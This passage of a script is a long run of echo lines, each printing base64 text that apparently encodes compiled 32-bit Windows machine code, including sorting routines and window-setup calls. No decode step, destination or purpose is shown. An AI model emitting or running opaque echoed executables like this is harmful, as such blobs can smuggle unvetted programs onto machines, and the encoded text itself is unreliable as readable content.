echo aASLRyxIg/gYD4euAQAAD7aAWGpAAP8khSxqQAD2RCQYAY1EJBxqCFZQjUQkIFB0
echo CuhqBwAA6X8BAADoIBYAAOl1AQAA9kQkGAGNRCQcaghWUI1EJCBQdArokggAAOlX
echo AQAA6EgXAADpTQEAAPZEJBgBjUQkHGoIVlCNRCQgUHQK6IoUAADpLwEAAOhAIwAA
echo 6SUBAAD2RCQYAY1EJBxqCFZQjUQkIFB0CuiiDQAA6QcBAADoWBwAAOn9AAAAi0Qk
echo GGoIVqgBdCKoAo1EJCRQjUQkIFB0CuiFEQAA6doAAADoGxAAAOnQAAAAqAKNRCQk
echo UI1EJCBQdAroIyAAAOm4AAAA6LkeAADprgAAAPZEJBgBjUQkHGoIVlCNRCQgUHQK
echo 6NsLAADpkAAAAOiRGgAA6YYAAAD2RCQYAY1EJBxqCFZQjUQkIFB0B+jzCAAA62vo
echo rBcAAOtk9kQkGAGNRCQcaghWUI1EJCBQdAfoIQoAAOtJ6NoYAADrQvZEJBgBjUQk
echo HGoIVlCNRCQgUHQH6A8OAADrJ+jIHAAA6yD2RCQYAY1EJBxqCFZQjUQkIFB0B+gN
echo EgAA6wXoxiAAAIPEEItEJBSJaASLRCQciRiLRCQUhe11BIkH6wOJRQCLRCQcXYXb
echo dQ1eW4lHBMZHMAFfwhAAiUMExkcwAV5bX8IQAHVoQACdaEAAxWhAAO1oQAA8aUAA
echo ZGlAAIZpQACoaUAATWhAAMppQADtaUAAAAoBCgIKCgMECgUGBwoKCgoKCgoCCgoI
echo CczMzMzMzMzMzMzMzMzMzFFWi3QkDIX2D4QUAgAAixaF0g+ECgIAAItGBItOEFOJ
echo RCQIiVQkEItaBFeLOItGLEiD+BgPh64BAAAPtoDUbEAA/ySFqGxAAPZEJBgBjUQk
echo DGoIUVCNRCQgUHQK6O8EAADpfwEAAOilEwAA6XUBAAD2RCQYAY1EJAxqCFFQjUQk
echo IFB0CugXBgAA6VcBAADozRQAAOlNAQAA9kQkGAGNRCQMaghRUI1EJCBQdAroDxIA
echo AOkvAQAA6MUgAADpJQEAAPZEJBgBjUQkDGoIUVCNRCQgUHQK6CcLAADpBwEAAOjd
echo GQAA6f0AAACLRCQYaghRqAF0IqgCjUQkFFCNRCQgUHQK6AoPAADp2gAAAOigDQAA
echo 6dAAAACoAo1EJBRQjUQkIFB0CuioHQAA6bgAAADoPhwAAOmuAAAA9kQkGAGNRCQM
echo aghRUI1EJCBQdAroYAkAAOmQAAAA6BYYAADphgAAAPZEJBgBjUQkDGoIUVCNRCQg
echo UHQH6HgGAADra+gxFQAA62T2RCQYAY1EJAxqCFFQjUQkIFB0B+imBwAA60noXxYA
echo AOtC9kQkGAGNRCQMaghRUI1EJCBQdAfolAsAAOsn6E0aAADrIPZEJBgBjUQkDGoI
echo UVCNRCQgUHQH6JIPAADrBehLHgAAg8QQi0QkFIlYBItEJAyJOItEJBSF23UEiQbr
echo AokDi0QkDIX/dQ5fW4lGBMZGMAFeWcIIAIlHBF/GRjABW15ZwggAkPBqQAAYa0AA
echo QGtAAGhrQAC3a0AA32tAAAFsQAAjbEAAyGpAAEVsQABobEAAAAoBCgIKCgMECgUG
echo BwoKCgoKCgoCCgoICczMzFeLfCQIhf8PhGECAACLB4XAD4RXAgAAU4tcJBxWg/v/
echo dQyLTwSLdxCJRCQQ6zZTV+htOAAAi3QkJFZXiUQkGOheOAAAK/OLyEaDfCQQAA+E
echo GAIAAIXJD4QQAgAAg2wkEAiD6QiLRCQQiUwkIIsZi0wkGFWLaASDwQiLRCQgg/j/
echo dQOLRyxIg/gYD4ekAQAAD7aAkG9AAP8khWRvQAD2RCQYAY1EJCRRVlCNRCQgUHQK
echo 6CsCAADpdgEAAOjhEAAA6WwBAAD2RCQYAY1EJCRRVlCNRCQgUHQK6FQDAADpTwEA
echo AOgKEgAA6UUBAAD2RCQYAY1EJCRRVlCNRCQgUHQK6E0PAADpKAEAAOgDHgAA6R4B
echo AAD2RCQYAY1EJCRRVlCNRCQgUHQK6GYIAADpAQEAAOgcFwAA6fcAAACLRCQYUVao
echo AXQiqAKNRCQsUI1EJCBQdAroSgwAAOnVAAAA6OAKAADpywAAAKgCjUQkLFCNRCQg
echo UHQK6OgaAADpswAAAOh+GQAA6akAAAD2RCQYAY1EJCRRVlCNRCQgUHQK6KEGAADp
echo jAAAAOhXFQAA6YIAAAD2RCQYAY1EJCRRVlCNRCQgUHQH6LoDAADraOhzEgAA62H2
echo RCQYAY1EJCRRVlCNRCQgUHQH6OkEAADrR+iiEwAA60D2RCQYAY1EJCRRVlCNRCQg
echo UHQH6NgIAADrJuiRFwAA6x/2RCQYAY1EJCRRVlCNRCQgUHQH6NcMAADrBeiQGwAA
echo g8QQi0QkFIloBItEJCSJGItEJBSF7XUEiQfrA4lFAItEJCRdhdt1DV5biUcExkcw
echo AV/CGACJQwTGRzABXltfwhgAi/+0bUAA221AAAJuQAApbkAAd25AAJ5uQAC/bkAA
echo 4G5AAI1tQAABb0AAI29AAAAKAQoCCgoDBAoFBgcKCgoKCgoKAgoKCAnMzMzMzMzM
echo av9q//90JBj/dCQY/3QkGP90JBjoJ/3//8IQAMzMzMyD7AxTVot0JCBXg/4CdTSL
echo dCQci3wkIItMJCiLHosXigQLOgQRD4PyAAAAi8KJBokfiwaJGIsPiwZfXolBBFuD
echo xAzDD47UAAAAi3wkHIvGmYveK8KLyIsH0fkr2YlEJCSFyXQJiwCJRCQkSXX3i0AE
echo K/NVi2wkLFWJRCQUjUQkFFZQV+h4////VVP/dCQ8jUQkRFDoaP///4s/jUQkNItU
echo JEiDxCCJfCQQhfZ0RY1JAIXbdHCKDC86DCpyGok4TotMJBCJQQSLRCQQi1QkKIs4
echo iXwkEOsYiRBLi0wkKIlBBItEJCiLfCQQixCJVCQohfZ1voXbdBaJEItMJCiJQQSL
echo RCQoixCJVCQoS3Xqi1QkIItMJBRdiQqLTCQgiQFfXluDxAzDhfZ05OsGjZsAAAAA
echo iTiLTCQQiUEEi0QkEIs4iXwkEE516uvEzMzMzMzMzMyD7AxTVot0JCBXg/4CdTSL
echo dCQci3wkIItMJCiLHosXigQLOgQRD43yAAAAi8KJBokfiwaJGIsPiwZfXolBBFuD
echo xAzDD47UAAAAi3wkHIvGmYveK8KLyIsH0fkr2YlEJCSFyXQJiwCJRCQkSXX3i0AE
echo K/NVi2wkLFWJRCQUjUQkFFZQV+h4////VVP/dCQ8jUQkRFDoaP///4s/jUQkNItU
echo JEiDxCCJfCQQhfZ0RY1JAIXbdHCKDC86DCp8Gok4TotMJBCJQQSLRCQQi1QkKIs4
echo iXwkEOsYiRBLi0wkKIlBBItEJCiLfCQQixCJVCQohfZ1voXbdBaJEItMJCiJQQSL
echo RCQoixCJVCQoS3Xqi1QkIItMJBRdiQqLTCQgiQFfXluDxAzDhfZ05OsGjZsAAAAA
echo iTiLTCQQiUEEi0QkEIs4iXwkEE516uvEzMzMzMzMzMyD7AxTVot0JCBXg/4CdTaL
echo dCQci3wkIItMJCiLHosXZosEC2Y7BBEPg/oAAACLwokGiR+LBokYiw+LBl9eiUEE
echo W4PEDMMPjtwAAACLfCQci8aZi94rwovIiwfR+SvZiUQkJIXJdAmLAIlEJCRJdfeL
echo QAQr81WLbCQsVYlEJBSNRCQUVlBX6Hb///9VU/90JDyNRCREUOhm////iz+NRCQ0
echo i1QkSIPEIIl8JBCF9nRJkIXbD4R2AAAAZosML2Y7DCpyGok4TotMJBCJQQSLRCQQ
echo i1QkKIs4iXwkEOsYiRBLi0wkKIlBBItEJCiLfCQQixCJVCQohfZ1uIXbdBqNZCQA
echo iRCLTCQoiUEEi0QkKIsQiVQkKEt16otUJCCLTCQUXYkKi0wkIIkBX15bg8QMw4X2
echo dOSJOItMJBCJQQSLRCQQiziJfCQQTnXq68zMzMzMzMxVi+yD5PiD7BRTVot1EFeD
echo /gJ1Not1DItVCItNFIsGizrdBAHcHA/f4PbEQQ+FAgEAAIsGiQKJPosCiTiLDosC
echo iUEEX15bi+Vdww+O5AAAAIvGi96ZK8KLVQiLyNH5K9mLAolEJBCFyXQPjZsAAAAA
echo iwCJRCQQSXX3i0AEK/OLfRRXiUQkGI1EJBhWUFLobv///1dT/3UMjUQkLFDoX///
echo /4tFCI1MJDiLVCQwg8QgiziJfCQUhfZ0UY2kJAAAAACF23R3i0UU3QQC3BwH3+D2
echo xEF6Gok5TotEJBSJSASLTCQUi1QkEIs5iXwkFOsYiRFLi0QkEIlIBItMJBCLfCQU
echo ixGJVCQQhfZ1toXbdBiL/4kRi0QkEIlIBItMJBCLEYlUJBBLdeqLVQiLRCQYiQKL
echo RQyJCF9eW4vlXcOF9nTnkIk5i0QkFIlIBItMJBSLOYl8JBROdeqLVQiLRCQYX16J
echo AotFDFuJCIvlXcPMzMzMzIPsDFaLdCQcV4P+AnU6i1QkGIt0JByLTCQkizqLBtkE
echo D9kECN7Z3+D2xEEPhfwAAACLBokCiT6LAok4iw6LAl9eiUEEg8QMww+O3wAAAIt8
echo JBiLxpkrwlOLyIveiwfR+SvZiUQkJFWFyXQO6wONSQCLAIlEJChJdfeLQAQr84ts
echo JCxViUQkFI1EJBRWUFfobf///1VT/3QkPI1EJERQ6F3///+LP41MJDSLVCRIg8Qg
echo iXwkEIX2dEmF23R32QQv2QQq3tnf4PbEQXoaiTlOi0QkEIlIBItMJBCLVCQoizmJ
echo fCQQ6xiJEUuLRCQoiUgEi0wkKIt8JBCLEYlUJCiF9nW3hdt0FokRi0QkKIlIBItM
echo JCiLEYlUJChLdeqLVCQgi0QkFF1biQKLRCQciQhfXoPEDMOF9nTkiTmLRCQQiUgE
echo i0wkEIs5iXwkEE516uvMzIPsDFNWi3QkIFeD/gJ1NIt0JByLfCQgi0wkKIseixeL
echo BAs7BBEPjfIAAACLwokGiR+LBokYiw+LBl9eiUEEW4PEDMMPjtQAAACLfCQci8aZ
echo i94rwovIiwfR+SvZiUQkJIXJdAmLAIlEJCRJdfeLQAQr81WLbCQsVYlEJBSNRCQU
echo VlBX6Hj///9VU/90JDyNRCREUOho////iz+NRCQ0i1QkSIPEIIl8JBCF9nRFjUkA
echo hdt0cIsMLzsMKnwaiThOi0wkEIlBBItEJBCLVCQoiziJfCQQ6xiJEEuLTCQoiUEE
echo i0QkKIt8JBCLEIlUJCiF9nW+hdt0FokQi0wkKIlBBItEJCiLEIlUJChLdeqLVCQg
echo i0wkFF2JCotMJCCJAV9eW4PEDMOF9nTk6waNmwAAAACJOItMJBCJQQSLRCQQiziJ
echo fCQQTnXq68TMzMzMzMzMzIPsDFNWV4t8JCSD/wJ1RItUJByLdCQgi3wkKIsKix6L
echo RDkEO0QfBA+PDAEAAHwMiwQ5OwQfD4P+AAAAi8OJAokOiwJfiQiLDosCXluJQQSD
echo xAzDD47gAAAAi3QkHIvHmYvfK8KLyIsG0fkr2YlEJCSFyXQJiwCJRCQkSXX3i0AE
echo K/tVi2wkLFWJRCQUjUQkFFdQVuho////VVP/dCQ8jUQkRFDoWP///4s2jUQkNItU
echo JEiDxCCJdCQQhf90UY1JAIXbdHyLTC4EO0wqBHwkfwiLDC47DCpyGokwT4tMJBCJ
echo QQSLRCQQi1QkKIswiXQkEOsYiRBLi0wkKIlBBItEJCiLdCQQixCJVCQohf91soXb
echo dBaJEItMJCiJQQSLRCQoixCJVCQoS3Xqi1QkIItMJBRdiQqLTCQgiQFfXluDxAzD
echo hf905Ikwi0wkEIlBBItEJBCLMIl0JBBPderrzMzMzMyD7AxWV4t8JCCD/wJ1PIt8
echo JByLTCQki3QkGIsH/zQIiwb/NAjo9xMAAIXAD4kIAQAAiw6LB4kGiQ+LBokIiw+L
echo Bl9eiUEEg8QMww+O6QAAAIt0JBiLx5krwlOLyIvfiwbR+SvZiUQkJFWFyXQMjUkA
echo iwCJRCQoSXX3i0AEK/uLbCQsVYlEJBSNRCQUV1BW6G3///9VU/90JDyNRCREUOhd
echo ////iw6DxCCLRCQojXQkFIlMJBCF/3RVhdsPhH8AAAD/NCj/NCnoVRMAAIXAeB6L
echo RCQQT4kGi0QkEIlwBIt0JBCLRCQoiw6JTCQQ6xyLRCQoS4kGi0QkKIlwBIt0JCiL
echo TCQQiwaJRCQohf91q4XbdBaJBotEJCiJcASLdCQoiwaJRCQoS3Xqi0wkIItEJBRd
echo W4kBi0QkHIkwX16DxAzDhf905IkOi0QkEIlwBIt0JBCLDolMJBBPderrzMzMzMzM
echo g+wMVleLfCQgg/8CdTyLfCQci0wkJIt0JBiLB/80CIsG/zQI6PcSAACFwA+JCAEA
echo AIsOiweJBokPiwaJCIsPiwZfXolBBIPEDMMPjukAAACLdCQYi8eZK8JTi8iL34sG
echo 0fkr2YlEJCRVhcl0DI1JAIsAiUQkKEl194tABCv7i2wkLFWJRCQUjUQkFFdQVuht
echo ////VVP/dCQ8jUQkRFDoXf///4sOg8Qgi0QkKI10JBSJTCQQhf90VYXbD4R/AAAA
echo /zQo/zQp6FUSAACFwHgei0QkEE+JBotEJBCJcASLdCQQi0QkKIsOiUwkEOsci0Qk
echo KEuJBotEJCiJcASLdCQoi0wkEIsGiUQkKIX/dauF23QWiQaLRCQoiXAEi3QkKIsG
echo iUQkKEt16otMJCCLRCQUXVuJAYtEJByJMF9eg8QMw4X/dOSJDotEJBCJcASLdCQQ
echo iw6JTCQQT3Xq68zMzMzMzIPsDFNWi3QkIFeD/gJ1Not0JByLfCQgi0wkKIseixdm
echo iwQLZjsEEQ+D+gAAAIvCiQaJH4sGiRiLD4sGX16JQQRbg8QMww+O3AAAAIt8JByL
echo xpmL3ivCi8iLB9H5K9mJRCQkhcl0CYsAiUQkJEl194tABCvzVYtsJCxViUQkFI1E
echo JBRWUFfodv///1VT/3QkPI1EJERQ6Gb///+LP41EJDSLVCRIg8QgiXwkEIX2dEmQ
echo hdsPhHYAAABmiwwvZjsMKnIaiThOi0wkEIlBBItEJBCLVCQoiziJfCQQ6xiJEEuL
echo TCQoiUEEi0QkKIt8JBCLEIlUJCiF9nW4hdt0Go1kJACJEItMJCiJQQSLRCQoixCJ
echo VCQoS3Xqi1QkIItMJBRdiQqLTCQgiQFfXluDxAzDhfZ05Ik4i0wkEIlBBItEJBCL
echo OIl8JBBOderrzMzMzMzMzIPsDFNWi3QkIFeD/gJ1Not0JByLfCQgi0wkKIseixdm
echo iwQLZjsEEQ+N+gAAAIvCiQaJH4sGiRiLD4sGX16JQQRbg8QMww+O3AAAAIt8JByL
echo xpmL3ivCi8iLB9H5K9mJRCQkhcl0CYsAiUQkJEl194tABCvzVYtsJCxViUQkFI1E
echo JBRWUFfodv///1VT/3QkPI1EJERQ6Gb///+LP41EJDSLVCRIg8QgiXwkEIX2dEmQ
echo hdsPhHYAAABmiwwvZjsMKnwaiThOi0wkEIlBBItEJBCLVCQoiziJfCQQ6xiJEEuL
echo TCQoiUEEi0QkKIt8JBCLEIlUJCiF9nW4hdt0Go1kJACJEItMJCiJQQSLRCQoixCJ
echo VCQoS3Xqi1QkIItMJBRdiQqLTCQgiQFfXluDxAzDhfZ05Ik4i0wkEIlBBItEJBCL
echo OIl8JBBOderrzMzMzMzMzIPsDFNWi3QkIFeD/gJ1NIt0JByLfCQgi0wkKIseixeK
echo BAs6BBEPhvIAAACLwokGiR+LBokYiw+LBl9eiUEEW4PEDMMPjtQAAACLfCQci8aZ
echo i94rwovIiwfR+SvZiUQkJIXJdAmLAIlEJCRJdfeLQAQr81WLbCQsVYlEJBSNRCQU
echo VlBX6Hj///9VU/90JDyNRCREUOho////iz+NRCQ0i1QkSIPEIIl8JBCF9nRFjUkA
echo hdt0cIoMLzoMKncaiThOi0wkEIlBBItEJBCLVCQoiziJfCQQ6xiJEEuLTCQoiUEE
echo i0QkKIt8JBCLEIlUJCiF9nW+hdt0FokQi0wkKIlBBItEJCiLEIlUJChLdeqLVCQg
echo i0wkFF2JCotMJCCJAV9eW4PEDMOF9nTk6waNmwAAAACJOItMJBCJQQSLRCQQiziJ
echo fCQQTnXq68TMzMzMzMzMzIPsDFNWi3QkIFeD/gJ1NIt0JByLfCQgi0wkKIseixeK
echo BAs6BBEPjvIAAACLwokGiR+LBokYiw+LBl9eiUEEW4PEDMMPjtQAAACLfCQci8aZ
echo i94rwovIiwfR+SvZiUQkJIXJdAmLAIlEJCRJdfeLQAQr81WLbCQsVYlEJBSNRCQU
echo VlBX6Hj///9VU/90JDyNRCREUOho////iz+NRCQ0i1QkSIPEIIl8JBCF9nRFjUkA
echo hdt0cIoMLzoMKn8aiThOi0wkEIlBBItEJBCLVCQoiziJfCQQ6xiJEEuLTCQoiUEE
echo i0QkKIt8JBCLEIlUJCiF9nW+hdt0FokQi0wkKIlBBItEJCiLEIlUJChLdeqLVCQg
echo i0wkFF2JCotMJCCJAV9eW4PEDMOF9nTk6waNmwAAAACJOItMJBCJQQSLRCQQiziJ
echo fCQQTnXq68TMzMzMzMzMzIPsDFNWi3QkIFeD/gJ1Not0JByLfCQgi0wkKIseixdm
echo iwQLZjsEEQ+G+gAAAIvCiQaJH4sGiRiLD4sGX16JQQRbg8QMww+O3AAAAIt8JByL
echo xpmL3ivCi8iLB9H5K9mJRCQkhcl0CYsAiUQkJEl194tABCvzVYtsJCxViUQkFI1E
echo JBRWUFfodv///1VT/3QkPI1EJERQ6Gb///+LP41EJDSLVCRIg8QgiXwkEIX2dEmQ
echo hdsPhHYAAABmiwwvZjsMKncaiThOi0wkEIlBBItEJBCLVCQoiziJfCQQ6xiJEEuL
echo TCQoiUEEi0QkKIt8JBCLEIlUJCiF9nW4hdt0Go1kJACJEItMJCiJQQSLRCQoixCJ
echo VCQoS3Xqi1QkIItMJBRdiQqLTCQgiQFfXluDxAzDhfZ05Ik4i0wkEIlBBItEJBCL
echo OIl8JBBOderrzMzMzMzMzFWL7IPk+IPsFFNWi3UQV4P+AnU2i3UMi1UIi00UiwaL
echo Ot0EAdwcD9/g9sQFD4oCAQAAiwaJAok+iwKJOIsOiwKJQQRfXluL5V3DD47kAAAA
echo i8aL3pkrwotVCIvI0fkr2YsCiUQkEIXJdA+NmwAAAACLAIlEJBBJdfeLQAQr84t9
echo FFeJRCQYjUQkGFZQUuhu////V1P/dQyNRCQsUOhf////i0UIjUwkOItUJDCDxCCL
echo OIl8JBSF9nRRjaQkAAAAAIXbdHeLRRTdBALcHAff4PbEAXUaiTlOi0QkFIlIBItM
echo JBSLVCQQizmJfCQU6xiJEUuLRCQQiUgEi0wkEIt8JBSLEYlUJBCF9nW2hdt0GIv/
echo iRGLRCQQiUgEi0wkEIsRiVQkEEt16otVCItEJBiJAotFDIkIX15bi+Vdw4X2dOeQ
echo iTmLRCQUiUgEi0wkFIs5iXwkFE516otVCItEJBhfXokCi0UMW4kIi+Vdw8zMzMzM
echo g+wMVot0JBxXg/4CdTqLVCQYi3QkHItMJCSLOosG2QQP2QQI3tnf4PbEBQ+K/AAA
echo AIsGiQKJPosCiTiLDosCX16JQQSDxAzDD47fAAAAi3wkGIvGmSvCU4vIi96LB9H5
echo K9mJRCQkVYXJdA7rA41JAIsAiUQkKEl194tABCvzi2wkLFWJRCQUjUQkFFZQV+ht
echo ////VVP/dCQ8jUQkRFDoXf///4s/jUwkNItUJEiDxCCJfCQQhfZ0SYXbdHfZBC/Z
echo BCre2d/g9sQBdRqJOU6LRCQQiUgEi0wkEItUJCiLOYl8JBDrGIkRS4tEJCiJSASL
echo TCQoi3wkEIsRiVQkKIX2dbeF23QWiRGLRCQoiUgEi0wkKIsRiVQkKEt16otUJCCL
echo RCQUXVuJAotEJByJCF9eg8QMw4X2dOSJOYtEJBCJSASLTCQQizmJfCQQTnXq68zM
echo g+wMU1aLdCQgV4P+AnU0i3QkHIt8JCCLTCQoix6LF4sECzsEEQ+O8gAAAIvCiQaJ
echo H4sGiRiLD4sGX16JQQRbg8QMww+O1AAAAIt8JByLxpmL3ivCi8iLB9H5K9mJRCQk
echo hcl0CYsAiUQkJEl194tABCvzVYtsJCxViUQkFI1EJBRWUFfoeP///1VT/3QkPI1E
echo JERQ6Gj///+LP41EJDSLVCRIg8QgiXwkEIX2dEWNSQCF23RwiwwvOwwqfxqJOE6L
echo TCQQiUEEi0QkEItUJCiLOIl8JBDrGIkQS4tMJCiJQQSLRCQoi3wkEIsQiVQkKIX2
echo db6F23QWiRCLTCQoiUEEi0QkKIsQiVQkKEt16otUJCCLTCQUXYkKi0wkIIkBX15b
echo g8QMw4X2dOTrBo2bAAAAAIk4i0wkEIlBBItEJBCLOIl8JBBOderrxMzMzMzMzMzM
echo g+wMU1ZXi3wkJIP/AnVEi1QkHIt0JCCLfCQoiwqLHotEOQQ7RB8ED4wMAQAAfwyL
echo BDk7BB8Phv4AAACLw4kCiQ6LAl+JCIsOiwJeW4lBBIPEDMMPjuAAAACLdCQci8eZ
echo i98rwovIiwbR+SvZiUQkJIXJdAmLAIlEJCRJdfeLQAQr+1WLbCQsVYlEJBSNRCQU
echo V1BW6Gj///9VU/90JDyNRCREUOhY////izaNRCQ0i1QkSIPEIIl0JBCF/3RRjUkA
echo hdt0fItMLgQ7TCoEfyR8CIsMLjsMKncaiTBPi0wkEIlBBItEJBCLVCQoizCJdCQQ
echo 6xiJEEuLTCQoiUEEi0QkKIt0JBCLEIlUJCiF/3Wyhdt0FokQi0wkKIlBBItEJCiL
echo EIlUJChLdeqLVCQgi0wkFF2JCotMJCCJAV9eW4PEDMOF/3TkiTCLTCQQiUEEi0Qk
echo EIswiXQkEE916uvMzMzMzIPsDFZXi3wkIIP/AnU8i3wkHItMJCSLdCQYiwf/NAiL
echo Bv80COg3BQAAhcAPjggBAACLDosHiQaJD4sGiQiLD4sGX16JQQSDxAzDD47pAAAA
echo i3QkGIvHmSvCU4vIi9+LBtH5K9mJRCQkVYXJdAyNSQCLAIlEJChJdfeLQAQr+4ts
echo JCxViUQkFI1EJBRXUFbobf///1VT/3QkPI1EJERQ6F3///+LDoPEIItEJCiNdCQU
echo iUwkEIX/dFWF2w+EfwAAAP80KP80KeiVBAAAhcB/HotEJBBPiQaLRCQQiXAEi3Qk
echo EItEJCiLDolMJBDrHItEJChLiQaLRCQoiXAEi3QkKItMJBCLBolEJCiF/3Wrhdt0
echo FokGi0QkKIlwBIt0JCiLBolEJChLdeqLTCQgi0QkFF1biQGLRCQciTBfXoPEDMOF
echo /3TkiQ6LRCQQiXAEi3QkEIsOiUwkEE916uvMzMzMzMyD7AxWV4t8JCCD/wJ1PIt8
echo JByLTCQki3QkGIsH/zQIiwb/NAjoNwQAAIXAD44IAQAAiw6LB4kGiQ+LBokIiw+L
echo Bl9eiUEEg8QMww+O6QAAAIt0JBiLx5krwlOLyIvfiwbR+SvZiUQkJFWFyXQMjUkA
echo iwCJRCQoSXX3i0AEK/uLbCQsVYlEJBSNRCQUV1BW6G3///9VU/90JDyNRCREUOhd
echo ////iw6DxCCLRCQojXQkFIlMJBCF/3RVhdsPhH8AAAD/NCj/NCnolQMAAIXAfx6L
echo RCQQT4kGi0QkEIlwBIt0JBCLRCQoiw6JTCQQ6xyLRCQoS4kGi0QkKIlwBIt0JCiL
echo TCQQiwaJRCQohf91q4XbdBaJBotEJCiJcASLdCQoiwaJRCQoS3Xqi0wkIItEJBRd
echo W4kBi0QkHIkwX16DxAzDhf905IkOi0QkEIlwBIt0JBCLDolMJBBPderrzMzMzMzM
echo g+wMU1aLdCQgV4P+AnU2i3QkHIt8JCCLTCQoix6LF2aLBAtmOwQRD4b6AAAAi8KJ
echo BokfiwaJGIsPiwZfXolBBFuDxAzDD47cAAAAi3wkHIvGmYveK8KLyIsH0fkr2YlE
echo JCSFyXQJiwCJRCQkSXX3i0AEK/NVi2wkLFWJRCQUjUQkFFZQV+h2////VVP/dCQ8
echo jUQkRFDoZv///4s/jUQkNItUJEiDxCCJfCQQhfZ0SZCF2w+EdgAAAGaLDC9mOwwq
echo dxqJOE6LTCQQiUEEi0QkEItUJCiLOIl8JBDrGIkQS4tMJCiJQQSLRCQoi3wkEIsQ
echo iVQkKIX2dbiF23QajWQkAIkQi0wkKIlBBItEJCiLEIlUJChLdeqLVCQgi0wkFF2J
echo CotMJCCJAV9eW4PEDMOF9nTkiTiLTCQQiUEEi0QkEIs4iXwkEE516uvMzMzMzMzM
echo g+wMU1aLdCQgV4P+AnU2i3QkHIt8JCCLTCQoix6LF2aLBAtmOwQRD476AAAAi8KJ
echo BokfiwaJGIsPiwZfXolBBFuDxAzDD47cAAAAi3wkHIvGmYveK8KLyIsH0fkr2YlE
echo JCSFyXQJiwCJRCQkSXX3i0AEK/NVi2wkLFWJRCQUjUQkFFZQV+h2////VVP/dCQ8
echo jUQkRFDoZv///4s/jUQkNItUJEiDxCCJfCQQhfZ0SZCF2w+EdgAAAGaLDC9mOwwq
echo fxqJOE6LTCQQiUEEi0QkEItUJCiLOIl8JBDrGIkQS4tMJCiJQQSLRCQoi3wkEIsQ
echo iVQkKIX2dbiF23QajWQkAIkQi0wkKIlBBItEJCiLEIlUJChLdeqLVCQgi0wkFF2J
echo CotMJCCJAV9eW4PEDMOF9nTkiTiLTCQQiUEEi0QkEIs4iXwkEE516uvMzMzMzMzM
echo i0QkBIXAdD+LTCQIhcl0L2aLEGY7EXUfZoXSdBVmi1ACZjtRAnUQg8AEg8EEZoXS
echo dd4zwMIIABvAg8gBwggAuAEAAADCCACLRCQIhcB042aDOAB03YPI/8IIAMzMzMzM
echo i0QkBIXAdB2LTCQIhcl0DVFQ6FjF//+DxAjCCAC4AQAAAMIIAItEJAiFwHQMZoM4
echo AHQGg8j/wggAM8DCCABVi+xRUWoIjUX4agBQ6HDC//+DxAzHRfgIAAAAjUX4x0X8
echo SAsAAFD/FVh2QQBqAP8VeHZBAIvlXcNW6KQGAABqAYvw6FIHAAD/dCQQ/3QkDP90
echo JBRW/xXQdUEAagCL8Og2BwAAi8ZewgwAg3wkBABXdDb/dCQI6LzE//9ZjQRFAgAA
echo AFBqAP81EIBBAP8VOHVBAIv4hf90EP90JAhX6JvE//9ZWYvHX8MzwF/Dg3wkBAB0
echo Ev90JARqAP81EIBBAP8VPHVBAMNVi+yLRQxISA+EhQAAAIPoDnQeLQEBAAB0B13/
echo JdR1QQCLRRAPt8At6AMAAHQTSHV+6AgEAAD/dQj/Fdh1QQDrblZXauv/dQj/Fdx1
echo QQD/NdiAQQCL+P8V4HVBAI1wAY0MNlFqAP81EIBBAP8VOHVBAFZQ/zXYgEEAiQf/
echo FeR1QQDouAMAAP91CP8V2HVBAF9e6xz/NRSAQQD/NRhxQQD/Feh1QQDHBdCAQQAB
echo AAAAM8BdwhAAg+xgU1VWV/90JHQz9ol0JBSL7ujX/v///3QkfIvYiVwkHOjI/v//
echo /7QkhAAAAImEJIAAAADotf7//4PEDIv4OTXMgEEAdQ1qEf8VUHZBAKPMgEEAoRSA
echo QQBqAVDHRCRIMAAAAMdEJEwDAAAAx0QkULSOQACJdCRUiXQkWIlEJFz/Fex1QQBo
echo AH8AAFaJRCRg/xXwdUEAiUQkXKEYcUEAiUQkaI1EJEBQx0QkZBAAAACJdCRoiXQk
echo cP8V9HVBAIk10IBBAOifBAAAagGj4IBBAOhKBQAAoeCAQQCFwHQkUP8V+HVBAIXA
echo dBlW/zXggEEA/xX8dUEAxwXkgEEAAQAAAOsGiTXkgEEAVv81FIBBAFboUwQAAIs1
echo AHZBAFBoggAAAGgsAQAAagH/1pkrwtH4g+hBUGoA/9aLNQR2QQCZK8LR+C2WAAAA
echo UGgAAMgQU/81GHFBAGoA/9aL2IXbD4TvAQAAjUQkEFBq61P/FQh2QQAzwFD/NRSA
echo QQBQU2oWaBgBAABqCmoKaAsAAFD/tCSYAAAAaGQwQQBQ/9aLNQx2QQBqAf81zIBB
echo AKPcgEEAajBQ/9b2hCSAAAAAAXQDaiBdagD/NRSAQQCBzYAAAVBqClNqFWgTAQAA
echo aiBqClWLLQR2QQBqAGh0MEEAaAACAAD/1WoB/zXMgEEAo9iAQQBqMFD/1v812IBB
echo AP8VEHZBAIX/dCpXagBqDP812IBBAP/WV+iXwf//WVBX6I/B//9ZUGixAAAA/zXY
echo gEEA/9ZqAP81FIBBALjoAwAAUFNqGWpQakNqbmgBAAFQaIAwQQBoiDBBAGoA/9Vq
echo Af81zIBBAKPUgEEAajBQ/9ZqDVhmiUQkGrjoAwAAahtmiUQkIFhmiUQkILjpAwAA
echo ZolEJCKNRCQYagJQxkQkIAHGRCQmAf8VFHZBAFOL8P8VGHZBAFP/FRx2QQDrPGoA
echo agBqAI1EJDBQ/xUgdkEAhcB0MI1EJCRQVlP/FSR2QQCFwHUWjUQkJFD/FSh2QQCN
echo RCQkUP8VLHZBAIM90IBBAAB0u4X2dAdW/xUwdkEAg3wkEAB0PP90JBDol8D//1n/
echo tCSEAAAAUOjETwAA/3QkEFDohcD//1lZ/3QkEGoA/zUQgEEA/xU8dUEAg3wkEAB1
echo DP+0JIQAAADoc1AAAP90JBToxPv///90JHjou/v//1fotfv//4PEDF9eXVuDxGDC
echo FACDPeSAQQAAdA5qAf814IBBAP8V/HVBAGoA6HgCAADDVYvs/00MdTaDfRQAdDBX
echo /3UUv2cEAABqAVf/dQj/FQx2QQBoyAAAAP8VKHVBAP91FGoBV/91CP8VNHZBAF8z
echo wF3CEACB7DACAABTVVcz/zk96IBBAHURV8cF6IBBAAEAAAD/FXh2QQBqII1EJBhX
echo UOjqvP//g8QMaJgwQQD/FUB1QQCL6LsEAQAAhe0PhAgBAABWizUsdUEAaLAwQQBV
echo /9ZoxDBBAFWJRCQY/9aLjCRIAgAAiUQkFIXJdQW5JDBBAGgDAQAAUY1EJEBQ6B+/
echo //8zwGaJhCRKAgAAjUQkRFDoL7///4PEEGpcWYP4A34OZjlMRDZ1BzPJZolMRDaL
